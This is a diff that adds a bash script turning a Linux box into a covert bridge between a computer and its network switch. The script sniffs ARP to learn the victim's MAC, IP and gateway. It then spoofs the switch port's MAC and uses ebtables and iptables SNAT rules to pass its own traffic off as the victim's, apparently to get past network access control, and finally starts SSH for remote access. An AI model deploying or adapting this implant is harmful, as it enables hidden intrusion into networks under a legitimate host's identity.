@@ -1,0 +1,48 @@
+#!/bin/bash
+
+# need bridge-utils and macchanger
+
+SWINT=eth0
+SWMAC=`ifconfig $SWINT | grep -i hwaddr | awk '{ print $5 }'`
+
+BRINT=br0
+COMPINT=eth3
+BRIP=169.254.66.66
+RANGE=61000-62000
+
+brctl addbr $BRINT
+brctl addif $BRINT $COMPINT
+brctl addif $BRINT $SWINT
+
+
+ifconfig $COMPINT 0.0.0.0 up
+ifconfig $SWINT 0.0.0.0 up
+ifconfig $BRINT 0.0.0.0 up promisc
+
+
+#sleep to let things settle a tad
+sleep 15
+mii-tool -r $COMPINT
+mii-tool -r $SWINT
+tcpdump -i eth3 -s0 -w /boot.pcap -c50 arp
+sleep 15 
+
+COMPMAC=`tcpdump -r /boot.pcap -nne | grep 'is-at' | awk '{ print $2 "," $4  $12 "," $14}' | sort | uniq -c | sort -rn | head -1 | awk -F ',' '{print $2}'`
+
+GWIP=`tcpdump -r /boot.pcap -nne | grep 'is-at' | awk '{ print $2 "," $4  $12 "," $14}' | sort | uniq -c | sort -rn | head -1 | awk -F ',' '{print $3}'`
+
+GWMAC=`tcpdump -r /boot.pcap -nne | grep 'is-at' | awk '{ print $2 "," $4  $12 "," $14}' | sort | uniq -c | sort -rn | head -1 | awk -F ',' '{print $4}'`
+
+
+COMPIP=`tcpdump -r /boot.pcap -nne | grep $COMPMAC | grep -w "$GWIP tell"|head -1 | awk '{print $14}' `
+
+
+ifconfig $BRINT down
+macchanger -m $SWMAC $BRINT
+ifconfig $BRINT $BRIP up promisc
+arp -s -i $BRINT 169.254.66.1 $GWMAC
+route add default gw 169.254.66.1
+ebtables -t nat -A POSTROUTING -s $SWMAC -o $SWINT -j snat --to-src $COMPMAC
+iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p tcp -j SNAT --to $COMPIP:$RANGE
+
+/etc/init.d/ssh start
